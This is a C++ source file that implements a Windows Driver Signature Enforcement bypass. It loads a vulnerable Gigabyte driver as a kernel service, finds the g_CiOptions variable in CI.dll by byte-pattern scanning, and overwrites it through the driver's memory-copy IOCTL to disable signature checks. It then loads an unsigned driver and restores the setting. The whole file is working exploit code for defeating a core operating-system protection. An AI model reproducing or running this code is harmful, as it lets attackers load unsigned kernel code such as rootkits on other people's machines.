#pragma warning( disable : 4005 4018 4477 )

#include "disable dse.h"
#include "winsvc.h"
#include <atlstr.h>

bool DSE::LoadGigDriver()
{
	//we will need to load the gigabyte driver to use its memcopy in order to disable DSE!
	//first thring first we need to create a service for the driver

	TCHAR* fileExt;
	TCHAR szDriverImagePath[256];
	bool results = false;

	GetFullPathName(TEXT("GigabyteDriver.sys"), 256, szDriverImagePath, &fileExt);

	SC_HANDLE hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hServiceMgr)
	{
		printf("[GDRV]OpenSCManager Failed %d\n", GetLastError());
		results = FALSE;
	}

	SC_HANDLE hServiceDDK = CreateService(hServiceMgr, "Gigabytedriver", "Gigabytedriver", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, szDriverImagePath, NULL, NULL, NULL, NULL, NULL);

	if (!hServiceDDK)
	{
		if (GetLastError() != ERROR_IO_PENDING && GetLastError() != ERROR_SERVICE_EXISTS)
		{
			printf("[GDRV]CrateService Failed %d\n", GetLastError());
			results = FALSE;
		}

		hServiceDDK = OpenService(hServiceMgr, "Gigabytedriver", SERVICE_ALL_ACCESS);
		if (!hServiceDDK)
		{
			printf("[GDRV]OpenService Failed %d\n", GetLastError());
			results = FALSE;
		}
	}

	results = StartService(hServiceDDK, NULL, NULL);
	if (!results)
	{
		if (GetLastError() != ERROR_IO_PENDING && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("[GDRV]StartService Failed %d\n", GetLastError());
			results = FALSE;
		}
		else
			results = TRUE;
	}

	CloseServiceHandle(hServiceDDK);
	CloseServiceHandle(hServiceMgr);

	if (results)
		printf("[GDRV]Loaded Gigabyte Driver\n");

	return results;
}

RTL_OSVERSIONINFOW DSE::GetRealOSVersion()
{
	typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

	HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
	if (hMod)
	{
		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)::GetProcAddress(hMod, "RtlGetVersion");
		if (fxPtr != nullptr)
		{
			RTL_OSVERSIONINFOW rovi = { 0 };
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (STATUS_SUCCESS == fxPtr(&rovi))
			{
				return rovi;
			}
		}
	}
	RTL_OSVERSIONINFOW rovi = { 0 };
	return rovi;
}

NTSTATUS DSE::GetCiMap(PVOID* imageBase)
{
	*imageBase = 0;

	const CHAR CiDll[] = "CI.dll";

	CHAR szFullModuleName[MAX_PATH * 2];

	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
		return STATUS_UNSUCCESSFUL;
	strcat_s(szFullModuleName, "\\");
	strcat_s(szFullModuleName, CiDll);

	*imageBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);

	return STATUS_SUCCESS;
}

NTSTATUS DSE::GetCiBase(PULONG_PTR imageBase)
{
	*imageBase = 0;

	const CHAR CiDll[] = "CI.dll";

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;

	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation, Modules, 2 * Size, nullptr);

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
		if (_stricmp(CiDll, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
		{
			*imageBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
			Status = STATUS_SUCCESS;
			break;
		}
	}

	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

bool DSE::CompareByte(const PUCHAR data, const PUCHAR pattern, UINT32 len)
{
	for (auto i = 0; i < len; i++)
	{
		if (data[i] != pattern[i] && pattern[i] != 0)
			return false;
	}
	return true;
}

NTSTATUS DSE::GetCiPOffset( PBYTE CiIntitalize, PULONG_PTR CipInitialize)
{
	*CipInitialize = 0;
	//thanks to https://github.com/holi4m/gdrv-loader-v2/blob/master/src/swind2.cpp
	const BYTE Pattern_CipInit_1709[17] = "\x4c\x8b\xcb\x4c\x8b\xc7\x48\x8b\xd6\x8b\xcd\xe8\x00\x00\x00\x00";
	const BYTE Pattern_CipInit[13] = "\x41\x8b\xca\x48\x83\xc4\x28\xe9\x00\x00\x00\x00";

	int Offset = 0;
	UINT16 j = 0;
	if (buildNumber >= 16299)
	{
		for (auto i = 0; i < 255; i++)
		{
			if (CompareByte(PUCHAR(CiIntitalize + i), PUCHAR(Pattern_CipInit_1709), 16))
			{
				Offset = i;
			}
		}
		for (j = 0; Pattern_CipInit_1709[j]; j++)
			;
	}
	else
	{
		for (auto i = 0; i < 255; i++)
		{
			if (CompareByte(PUCHAR(CiIntitalize + i), PUCHAR(Pattern_CipInit), 12))
			{
				Offset = i;
			}
		}
		for (j = 0; Pattern_CipInit[j]; j++)
			;
	}

	ULONG CipInitOffset = *reinterpret_cast<UINT32*>(CiIntitalize + Offset + j);
	*CipInitialize = (ULONG_PTR)CiIntitalize + CipInitOffset + Offset + j + 4;

	return STATUS_SUCCESS;
}

NTSTATUS DSE::GetGCiOffset(ULONG_PTR CipIntitalize,ULONG_PTR CiDllBase, PVOID CiMap, PULONG_PTR g_CiOptionsAddress)
{
	*g_CiOptionsAddress = 0;

	const BYTE Pattern_gCiOptions[10] = "\x49\x8b\xe9\x89\x0d\x00\x00\x00\x00";

	int Offset = 0;
	UINT16 j = 0;

	for (auto i = 0; i < 255; i++)
	{

		if (CompareByte(PUCHAR(CipIntitalize + i), PUCHAR(Pattern_gCiOptions), 12))
		{
			Offset = i;
		}
	}
	for (j = 0; Pattern_gCiOptions[j]; j++);

	INT32 RealOffset = *reinterpret_cast<INT32*>(CipIntitalize + Offset + j);
	UINT64 g_CiOptions = CipIntitalize + RealOffset + Offset + j + 4;
	*g_CiOptionsAddress = CiDllBase + g_CiOptions - (UINT64)CiMap;

	return STATUS_SUCCESS;
}

NTSTATUS DSE::FinalCalculation(PVOID* g_CiOptionsAddress)
{
	*g_CiOptionsAddress = 0;

	//after this we need to find the pointer address of the mapped CI.dll and also the base address of CI.dll
	PVOID ciMapped;
	NTSTATUS status = GetCiMap(&ciMapped);
	if (!NT_SUCCESS(status))
		printf("[CI]Failed to get ciMap\n");
	else
		printf("[CI]CiMap pointer @ %p\n", ciMapped);

	ULONG_PTR CiDllBase;
	status = GetCiBase(&CiDllBase);
	if (!NT_SUCCESS(status))
		printf("[CI]Failed to get ciBase\n");
	else
		printf("[CI]CiBase address @ %p\n", CiDllBase);

	//now we need to get address of CiInitalize
	PBYTE CiInitialize = NULL;
	HMODULE hModule = LoadLibraryExA("CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hModule)
		printf("[CI]Failed to load libary\n");

	CiInitialize = (PBYTE)GetProcAddress(hModule, "CiInitialize");
	if (!CiInitialize)
		printf("[CI]Failed to Get CiInitialize address\n");
	else
		printf("[CI]CiInitialize address @ 0x%p\n", CiInitialize);

	//now we need to find the offset of CipInitialize witch will point us to G_CiOptions later.
	ULONG_PTR CipInitialize = 0;
	GetCiPOffset(CiInitialize, &CipInitialize);
	if (!CipInitialize)
		printf("[CI]Failed to get CipInitialize\n");
	else
		printf("[CI]CipInitialize address @ %p\n", CipInitialize);

	//now we need to find G_CiOptions offset then do a final cal to find the address of G_CiOptions!
	ULONG_PTR G_CiOptions = 0;
	GetGCiOffset(CipInitialize, CiDllBase, ciMapped, &G_CiOptions);
	if (!G_CiOptions)
		printf("[CI]Failed to get G_CiOptions\n");
	else
		printf("[CI]G_CiOptions address @ 0x%p\n", G_CiOptions);

	*g_CiOptionsAddress = reinterpret_cast<PVOID>(G_CiOptions);

	if (!G_CiOptions)
		return STATUS_UNSUCCESSFUL;
	else
		return STATUS_SUCCESS;
}

NTSTATUS DSE::DisableDSE(PVOID g_CiOptionsAddress, HANDLE driverHandle)
{
	GIO_MemCpyStruct mystructIn;
	mystructIn.dest = reinterpret_cast<ULONG64>(g_CiOptionsAddress);
	ULONG64* cioptions = (ULONG64*)malloc(sizeof(ULONG64));
	*cioptions = 0xe;
	mystructIn.src = cioptions;
	mystructIn.size = 1;

	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	NTSTATUS status = DeviceIoControl(driverHandle, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);

	if (!NT_SUCCESS(status))
	{
		printf("[GDRV]DSE Failed to Disabled\n");
		return STATUS_UNSUCCESSFUL;
	}
	else
	{
		printf("[GDRV]DSE Disabled\n");
		return STATUS_SUCCESS;
	}
}

bool DSE::LoadIOCTLDriver()
{
	TCHAR* fileExt;
	TCHAR szDriverImagePath[256];
	bool results = false;

	GetFullPathName(TEXT("IOCTLDriver.sys"), 256, szDriverImagePath, &fileExt);

	SC_HANDLE hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hServiceMgr)
	{
		printf("[IOCTL]OpenSCManager Failed %d\n", GetLastError());
		results = FALSE;
	}

	SC_HANDLE hServiceDDK = CreateService(hServiceMgr,"IOCTLdriver", "IOCTLdriver", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, szDriverImagePath, NULL, NULL, NULL, NULL, NULL);

	if (!hServiceDDK)
	{
		if (GetLastError() != ERROR_IO_PENDING && GetLastError() != ERROR_SERVICE_EXISTS)
		{
			printf("[IOCTL]CrateService Failed %d\n", GetLastError());
			results = FALSE;
		}

		hServiceDDK = OpenService(hServiceMgr, "IOCTLdriver", SERVICE_ALL_ACCESS);
		if (!hServiceDDK)
		{
			printf("[IOCTL]OpenService Failed %d\n", GetLastError());
			results = FALSE;
		}
	}

	results = StartService(hServiceDDK, NULL, NULL);
	if (!results)
	{
		if (GetLastError() != ERROR_IO_PENDING && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("[IOCTL]StartService Failed %d\n", GetLastError());
			results = FALSE;
		}
		else
			results = TRUE;
	}

	CloseServiceHandle(hServiceDDK);
	CloseServiceHandle(hServiceMgr);

	if (results)
		printf("[IOCTL]Loaded IOCTL Driver\n");

	return results;
}

NTSTATUS DSE::EnableDSE(PVOID g_CiOptionsAddress, HANDLE driverHandle)
{
	GIO_MemCpyStruct mystructIn;
	mystructIn.dest = reinterpret_cast<ULONG64>(g_CiOptionsAddress);
	ULONG64* cioptions = (ULONG64*)malloc(sizeof(ULONG64));
	*cioptions = 0x16;
	mystructIn.src = cioptions;
	mystructIn.size = 1;

	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	NTSTATUS status = DeviceIoControl(driverHandle, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);

	if (!NT_SUCCESS(status))
	{
		printf("[GDRV]DSE Failed to Enable\n");
		return STATUS_UNSUCCESSFUL;
	}
	else
	{
		printf("[GDRV]DSE Enable\n");
		return STATUS_SUCCESS;
	}
}

bool DSE::UnLoadGigDriver()
{
	SERVICE_STATUS_PROCESS ssp;
	bool results;

	SC_HANDLE hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hServiceMgr)
	{
		printf("[GDRV]OpenSCManager Failed %d\n", GetLastError());
		results = FALSE;
	}

	SC_HANDLE hServiceDDK = OpenService(hServiceMgr, "Gigabytedriver", SERVICE_ALL_ACCESS);
	if (!hServiceDDK)
	{
		printf("[GDRV]OpenService Failed %d\n", GetLastError());
		results = FALSE;
	}

	results = ControlService(hServiceDDK, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);

	if (!results)
	{
		results = FALSE;
		printf("[GDRV]ControlService Failed %d\n", GetLastError());
	}
	else
	{
		results = TRUE;
		printf("[GDRV]Giagabyte Driver Unloaded\n");
	}

	results = DeleteService(hServiceDDK);

	if (!results)
	{
		results = FALSE;
		printf("[GDRV]DeleteService Failed %d\n", GetLastError());
	}
	else
	{
		results = TRUE;
		printf("[GDRV]Giagabyte Driver Service Deleted\n");
	}

	CloseServiceHandle(hServiceDDK);
	CloseServiceHandle(hServiceMgr);

	return results;
}

bool DSE::UnLoadIOCTLDriver()
{
	SERVICE_STATUS_PROCESS ssp;
	bool results;

	SC_HANDLE hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hServiceMgr)
	{
		printf("[IOCTL]OpenSCManager Failed %d\n", GetLastError());
		results = FALSE;
	}

	SC_HANDLE hServiceDDK = OpenService(hServiceMgr, "IOCTLdriver", SERVICE_ALL_ACCESS);
	if (!hServiceDDK)
	{
		printf("[IOCTL]OpenService Failed %d\n", GetLastError());
		results = FALSE;
	}

	results = ControlService(hServiceDDK, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);

	if (!results)
	{
		results = FALSE;
		printf("[IOCTL]ControlService Failed %d\n", GetLastError());
	}
	else
	{
		results = TRUE;
		printf("[IOCTL]IOCTL Driver Unloaded\n");
	}

	results = DeleteService(hServiceDDK);

	if (!results)
	{
		results = FALSE;
		printf("[IOCTL]DeleteService Failed %d\n", GetLastError());
	}
	else
	{
		results = TRUE;
		printf("[IOCTL]IOCTL Driver Service Deleted\n");
	}

	CloseServiceHandle(hServiceDDK);
	CloseServiceHandle(hServiceMgr);

	return results;
}

